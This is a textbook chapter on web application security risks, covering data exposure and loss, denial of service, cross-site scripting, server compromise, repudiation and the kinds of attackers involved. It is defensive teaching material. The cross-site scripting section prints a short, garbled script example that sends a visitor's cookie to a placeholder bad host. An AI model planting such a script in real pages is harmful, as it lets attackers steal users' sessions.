14Web Application Security Risks

In this chapter we look at application security, within the broader theme of securing an entire web application. Indeed, every single part of our web applications will need to be secured from possible misuse (accidental or intentional), and we will want to develop some strategies for developing our application that will help us stay secure.

Key topics covered in this chapter include

 ■ Identifying the threats we face

 ■ Understanding who we’re dealing with

Identifying the Threats We FaceWe will begin by looking at the specific security threats facing a modern web application. The first step in building a secure application is to understand the nature of the risks, so that we can think about how to protect against those risks.

Access to Sensitive DataPart of our job as web application designers and programmers is to ensure that any data the user entrusts to us are safe, as are any data that we are given from other departments. When we expose parts of this information to users of our web application, it must be in such a way that they see only the information that they are permitted to see, and they most certainly cannot see information for other users.

If we are writing a front end for an online stock or mutual funds trading system, people who can get access to our account tables might be able to find out such information as users’ taxpayer identification numbers (Social Security Numbers, or SSN, in the United States), personal information as to what securities the users hold and how much of each, and in extreme cases, even bank account information for users.

332

Chapter 14  Web Application Security Risks 

Even the exposure of a table full of names and addresses is a serious violation of security. Customers value their privacy very highly, and a huge list of names and addresses, plus some inferred information about them (such as「all ten thousand of these people like to shop at online tobacco stores」) creates a potential sellable item to marketing firms that do not play by the rules, spammers, and so on.

All of these are terrible scenarios, but the two most commonly seen that cause huge problems are leakage of credit card numbers, and leakage of passwords.

The value of credit card numbers is obvious—anyone obtaining a list of valid numbers along with expiration dates, cardholder names, and so on, can either use the data themselves, or more commonly, sell a list of card numbers to the highest bidder.

Passwords may be less obviously interesting. Once an attacker has obtained access to sensitive data inside your application, you may be asking why passwords would have any further use. The answer is that users commonly re-use passwords on different websites. The username and password John Smith used to sign up for your photo sharing app stand a good chance of being the same username and password that he uses for his online banking.

In some cases engineers put a lot of attention into protecting obviously personal information, but miss more subtle leakage of data. One good example of this which has been seen a few times is companies sharing logs, typically for other people to do research or data mining. 

Usage data like this can be mined for all kinds of interesting facts. If IPs are associated with the logs, you can uniquely identify patterns of a particular user and have a good guess as to their loca-tion. If web server logs contain URLs, as they generally do, these URLs may contain  usernames, passwords, or information about what (potentially private) endpoints are available on the website.

It goes without saying that any of the above data leaks will damage your reputation: you will lose customers who are unwilling to trust you after a security incident.

Reducing the RiskTo reduce the risk of exposure, you need to limit the methods by which information can be accessed and limit the people who can access it. This process involves designing with  security in mind, configuring your server and software properly, programming carefully, testing thoroughly, removing unnecessary services from the web server, and requiring authentication.

You need to design, configure, code, and test carefully to reduce the risk of a successful attack and, equally important, to reduce the chance that an error will leave your information open to accidental exposure.

You also need to remove unnecessary services from your web server to decrease the number of potential weak points. Each service you are running might have vulnerabilities. Each one needs to be kept up to date to ensure that known vulnerabilities are not present. The services that you do not use might be more dangerous. If you never use the command rcp, for example, why have the service installed?1 If you tell the installer that your machine is a network host, the 

1. Even if you do currently use rcp, you should remove it and use scp (secure copy) instead.

Identifying the Threats We Face

333

major Linux distributions and Windows will install a large number of services that you do not need and should remove.

Authentication means asking people to prove their identity. When the system knows who is making a request, it can decide whether that person is allowed access. A number of possible methods of authentication can be employed, but only two forms are commonly used on public websites: passwords and digital signatures. We talk a little more about both later.

Data is also at risk of exposure while it traverses a network. Although TCP/IP networks have many fine features that have made them the de facto standard for connecting diverse networks together as the Internet, security is not one of them. TCP/IP works by chopping your data into packets and then forwarding those packets from machine to machine until they reach their destination. This means that your data is passing through numerous machines on the way, as illustrated in Figure 14.1. Any one of those machines could view your data as it passes by.

Source

Destination

The Internet

Figure 14.1  Transmitting information via the Internet sends your information via a number of potentially untrustworthy hosts

To see the path that data takes from you to a particular machine, you can use the command traceroute (on a Unix machine). This command gives you the addresses of the machines that your data passes through to reach that host. For a host in your own country, data may pass through 10 different machines. For an international machine, it may pass through more than 20 intermediaries. If your organization has a large and complex network, your data might pass through 5 machines before it even leaves the building.

Attacks that involve accessing or modifying your data as it travels over the network are known as man-in-the-middle (MITM) attacks.

To protect confidential information, you can encrypt it before it is sent across a network and decrypt it at the other end. Web servers often use Secure Sockets Layer (SSL) to accomplish this as data travels between web servers and browsers. This is a fairly low-cost, low-effort way of securing transmissions, but because your server needs to encrypt and decrypt data rather than simply send and receive it, the number of visitors per second that a machine can serve is reduced.

334

Chapter 14  Web Application Security Risks 

Modification of DataAlthough the loss of data could be damaging, modification can be worse. What if somebody obtained access to your system and modified files? Although wholesale deletion will  probably be noticed and can be remedied from your backup, how long will it take you to notice modification?

Modifications to files could include changes to data or executable files. An attacker’s motiva-tion for altering data might be to deface your site or to obtain fraudulent benefits. Replacing executable files with sabotaged versions might give an attacker who has gained access on a single occasion a secret backdoor for future visits or a mechanism to gain higher privileges on the system.

You can protect data from modification as it travels over the network by computing a signature. This approach does not stop somebody from modifying the data, but if the recipient checks that the signature still matches when the file arrives, she will know whether the file has been modified. If the data is being encrypted to protect it from unauthorized viewing, using the signature will also make it very difficult to modify en route without detection.

Protecting files stored on your server from modification requires that you use the file  permission facilities your operating system provides and protect the system from unauthorized access. Using file permissions, users can be authorized to use the system but not be given free rein to modify system files and other users’ files. 

Detecting modification can be difficult. If, at some point, you realize that your system’s  security has been breached, how will you know whether important files have been modified? Some files, such as the data files that store your databases, are intended to change over time. Many others are intended to stay the same from the time you install them, unless you  deliberately upgrade them. Modification of both programs and data can be insidious, but although programs can be reinstalled if you suspect modification, you cannot know which version of your data was「clean.」

File integrity assessment software, such as Tripwire, records information about important files in a known safe state, probably immediately after installation, and can be used at a later time to verify that files are unchanged. 

Loss or Destruction of DataEvery bit as bad as having unauthorized users gain access to sensitive data is if we suddenly find that some portion of our data has been deleted or destroyed. If somebody manages to destroy tables in our database, our business could face irrecoverable consequences. If we are an online bank that displays bank account information, and somehow all the information for a particular account is lost, we are not a good bank. Much worse, if the entire table of users is deleted, we will find ourselves spending a large amount of time reconstructing databases and finding out who owns what.

It is important to note that loss or destruction of data does not have to come from malicious or accidental misuse of our system. If the building in which our servers are housed burns down, 

Identifying the Threats We Face

335

and all the servers and hard disks with it, we have lost a large amount of data and had better hope that we have adequate backups and disaster recovery plans.

Losing data can be more costly for you than having it revealed. If you have spent months building up your site, gathering user data and orders, how much would it cost you in time, reputation, and dollars to lose all that information? If you had no backups of any of your data, you would need to rewrite the website in a hurry and start from scratch. You would also have dissatisfied customers and fraudsters claiming that they ordered something that never arrived.

It is possible that crackers will break into your system and destroy your data. It is fairly likely that a programmer or administrator will at some point delete something by accident, but it is almost certain that you will occasionally lose a hard disk drive. Hard disk drives read and write data thousands of times per minute, and, occasionally, they fail. Murphy’s Law would tell you that the one that fails will be the most important one, long after you last made a backup.

Reducing the RiskYou can take various measures to reduce the chance of data loss. Secure your servers against crackers. Keep the number of staff with access to your machine to a minimum. Hire only competent, careful people. Buy good quality drives. Use Redundant Array of Inexpensive Disks (RAID) so that multiple drives can act like one faster, more reliable drive.

Regardless of its cause, you have only one real protection against data loss: backups. Backing up data is not rocket science. On the contrary, it is tedious, dull, and—you hope—useless, but it is vital. Make sure that your data is regularly backed up and make sure that you have tested your backup procedure to be certain that you can recover. Make sure that your backups are stored away from your computers. Although the chances that your premises will burn down or suffer some other catastrophic fate are unlikely, storing a backup offsite is a fairly cheap insurance policy.

Denial of ServiceOne of the most difficult threats to guard against is denial of service. Denial of service (DoS) occurs when somebody’s actions make it difficult or impossible for users to access a service, or delay their access to a time-critical service.

Having your servers rendered useless for hours, if not longer, can be a serious burden from which to recover. If you consider how ubiquitous many of the major sites on the Internet are and how you always expect them to be there, any downtime is a problem.

Again, as with some of the other threats, a DoS can come from forces other than malicious attack. A misconfigured network or an influx of users (after, say, your application being featured on a popular tech blog) can have the same effect.

In early 2013, a series of distributed denial of service (DDoS) attacks were made against US  financial institutions such as American Express and Wells Fargo. These sites are accustomed to high levels of traffic, and have excellent security teams working on them, but they are still vulnerable to being shut down for hours by a DoS attack. Although crackers generally have 

336

Chapter 14  Web Application Security Risks 

little to gain directly from shutting down a website, the proprietor might be losing money, time, and reputation.

Some sites have specific times when they expect to do most of their business. Online bookmaking sites experience huge demand just before major sporting events. One way that crackers attempted to profit from DDoS attacks in 2004 was by extorting money from online bookmakers with the threat of attacking during these peak demand times.

One of the reasons that DDoS attacks are so difficult to guard against is that they can be carried out in a huge number of ways. Methods could include installing a program on a target machine that uses most of the system’s processor time, reverse spamming, or using one of many automated tools. A reverse spam involves somebody sending out spam with the target listed as the sender. This way, the target will have thousands of angry replies to deal with, as well as having their real emails classifed as spam.

Automated tools exist to launch distributed DoS attacks on a target. Without needing much knowledge, somebody can scan a large number of machines for known vulnerabilities,  compromise a machine, and install the tool. Because the process is automated, an attacker can install the tool on a single host in less than five seconds. When enough machines have been co-opted, all are instructed to flood the target with network traffic. Machines that have been compromised in such a way are sometimes called zombies or bots, and a collection of  compromised machines used to launch an attack is called a botnet.

Reducing the RiskGuarding against DoS attacks is difficult in general. With a little research, you can find the default ports used by some common DDoS tools and close them. Your router might provide mechanisms to limit the percentage of traffic that uses particular protocols such as ICMP. Detecting hosts on your network being used to attack others is easier than protecting your machines from attack. If every network administrator could be relied on to vigilantly monitor his own network, DDoS would not be such a problem.

It’s generally a good idea to have a plan for what happens when you receive a massive influx of traffic, for whatever reason. 

One option is to block known problematic traffic at your load balancer. Of course, this only works as long as your load balancer survives, and as long as the traffic is coming from a recognizable set of IPs (like some botnets).

Another option is to develop a mechanism to have a way to make parts or all of the site static, even temporarily, and push it to a content distribution network. This works well for managing the friendly kind of traffic peak.

Another is to implement so called feature flagging in your application. This allows you to turn features on and off. In times of high load, you might switch off less-critical or more expensive features to cope with the extra traffic.

Some of the cloud hosting vendors, such as Amazon Web Services (AWS), provide auto-scaling mechanisms where more servers are automatically added to cope with traffic. This works 

Identifying the Threats We Face

337

well for friendly traffic peaks, but may not be helpful in a malicious DDoS situation, because auto-scaling can be very expensive.

Because there are so many possible methods of attack, the only really effective defense is to monitor normal traffic behavior and be ready to take countermeasures when abnormal situations occur. Under DDoS, even this may not be sufficient.

Malicious Code InjectionOne type of attack that has been particularly effective over the years via the web is what is called code injection. The well known of these is Cross Site Scripting (known as XSS, so as not to be confused with Cascading Style Sheets—CSS). What is particularly troubling about these attacks is that no obvious or immediate loss of data occurs, but instead some sort of code executes, causing varying degrees of information loss or redirection of users, possibly without their even noticing it. 

Cross Site Scripting basically works as follows:

1.  The malicious user, in a form that will then turn around and display to other people the input it was given (such as a comment entry form or message board entry form), enters text that not only represents the message they want to enter, but some script to execute on the client, such as the following:  <script ="text/javascript">    this.document = "go.somewhere.bad?cookie=" + this.cookie;  </script ="text/javascript">

2.  The malicious user then submits the form and waits.

3.  The next user of the system who goes to view the page that contains that text entered 

by the malicious user will execute the script code that was entered. In our simple example, the user will be redirected, along with any cookie information from the originating site.

Although this is a trivial example, the possibilities of what can be done with an XSS attack are very wide.

There are other forms of malicious code injection. For example, we talked in depth about SQL injection attacks in the last section of this book. 

It’s also possible to take advantage of vulnerabilities in your code, your installed  applications, or your configuration to upload arbitrary code to run on your web server, leading to a  compromised web server. We discuss this more in the next section.

Reducing the RisksAvoiding forms of code and command injection attacks requires deep knowledge and  attention to detail. We will go through some of the tools and techniques in Chapter 15,「Building a Secure Web Application.」

338

Chapter 14  Web Application Security Risks 

Compromised ServerAlthough the effects of a compromised server can include the effects of many of the threats previously listed, it is still worth noting that sometimes the goal of invaders will be to gain access to our system, most often as a super user (administrator on Windows-based systems and root on Unix-like systems). With this, they have nearly free reign over the compromised computer and can execute any program they want, shut the computer off, or install software.

We want to be particularly vigilant against this type of attack because one of the first things attackers are likely to do after they have compromised a server is to cover their tracks to hide the evidence.

Reducing the RisksProtecting against server compromise requires an approach called defense-in-depth, which we will discuss in more detail in Chapter 15. In summary, it means thinking about all the possible things that could go wrong in different aspects of a system, and putting in layers of protection for each aspect.

One risk mitigation strategy worth mentioning here is the use of an Intrusion Detection System (IDS) such as Snort. These are used to monitor and alert for network traffic that looks like an attack.

RepudiationThe final risk we will consider is repudiation. Repudiation occurs when a party involved in a transaction denies having taken part. E-commerce examples might include a person ordering goods off a website and then denying having authorized the charge on his credit card, or a person agreeing to something in email and then claiming that somebody else forged the email.

Ideally, financial transactions should provide the peace of mind of nonrepudiation to both parties. Neither party could deny their part in a transaction, or, more precisely, both parties could conclusively prove the actions of the other to a third party, such as a court. In practice, this rarely happens.

Reducing the RiskAuthentication provides some surety about whom you are dealing with. If issued by a trusted organization, digital certificates of authentication can provide greater confidence. The certificate authentication system has some flaws, but it’s the current standard.

Messages sent by each party also need to be tamperproof. There is not much value in being able to demonstrate that Corp Pty Ltd sent you a message if you cannot also demonstrate that what you received was exactly what the company sent. As mentioned previously, signing or encrypting messages makes them difficult to surreptitiously alter.

For transactions between parties with an ongoing relationship, digital certificates together with either encrypted or signed communications are an effective way of limiting repudiation. 

Understanding Who We’re Dealing With

339

For one-off transactions, such as the initial contact between a web application and a stranger bearing a credit card, they are not so practical.

Web companies need to provide proof of their identity and a few hundred dollars to a certifying authority such as Symantec (http://www.symantec.com/), Thawte (http://www.thawte.com/), or Comodo (http://www.comodo.com/) to assure visitors of the company’s bona fides. Would that same company be willing to turn away every customer who was not willing to do the same to prove his or her identity? For small transactions, merchants are generally willing to accept a certain level of fraud or repudiation risk rather than turn away business.

Understanding Who We’re Dealing WithAlthough we might instinctively classify all those who cause security problems as bad or malicious people intent on causing us harm, there are often other actors in this arena who are unwitting participants and might not appreciate being called such.

Attackers and CrackersThe most obvious and famous group are what we will call crackers or attackers. We resist the urge to call them hackers, because this is annoying to real hackers, most of whom are perfectly honest and well-intentioned programmers. Crackers attempt, under all sorts of motivations, to find weaknesses and work their way past these to achieve their goals. They can be driven by greed, if they are after financial information or credit card numbers; be driven by money, if they are being paid by a competing firm to get information from your systems; or can simply be talented individuals looking for the thrill of breaking into yet another system. Although they present a serious threat to us, it is a mistake to focus all our efforts on them.

Unwitting Users of Infected MachinesIn addition to crackers, we might have to worry about a large number of other people. With all the weaknesses and security flaws in many pieces of modern software, an alarming percentage of computers are infected with software that performs all sorts of dubious tasks. Some users of your internal corporate network might have some of this software on their machines, and that software might be attacking your server without those users even realizing it.

Disgruntled EmployeesCompany employees constitute another group you might have to worry about. These employ-ees, for some reason or another, are intent on causing harm to the company for which they work. Whatever the motivation, they might attempt to become amateur crackers themselves, or acquire tools from external sources by which they can probe and attack servers from inside the corporate network. If we secure ourselves well from the outside world, but leave ourselves completely exposed internally, we are not secure. This is a good argument for implementing what is known as a demilitarized zone (DMZ), which we will cover in the next chapter.

340

Chapter 14  Web Application Security Risks 

Hardware ThievesA security threat you might not think to protect yourself against is somebody simply walking into the server room, unplugging a piece of equipment, and walking out of the building with it. You might find yourself surprised at how easy it is to walk into a great many corporate offices and just stroll around without anybody suspecting anything. Somebody walking into the right room at the right time might find themselves with a shiny new server, along with hard disks full of sensitive data.

OurselvesAs unpleasant as it may be to hear, one of the biggest headaches we might have for the security of our systems is ourselves and the code we write. If we do not pay attention to security, if we write sloppy code and do not spend any attention on testing and verifying the security of our system, we have given malicious users a huge helping hand in their attempts to compromise our system.

If you are going to do it, do it properly. The Internet is particularly unforgiving to those prone to carelessness or laziness. The hardest part of sticking to this mantra is convincing a boss or financial decision maker that this is worthwhile. A few minutes teaching them about the negative effects (including those against the bottom line) of security lapses should be enough to convince them that the extra effort will be worthwhile in a world where your data is worth everything.

NextA good resource for learning more about the threats to your web application is the Open Web Application Security Project (OWASP). Each year they publish a list of the top 10 threats to web applications, as well as a wide range of excellent ebooks and other resources on web security. You can find them at https://www.owasp.org.

In Chapter 15,「Building a Secure Web Application,」we will look at how to protect against the threats we discussed in this chapter. 

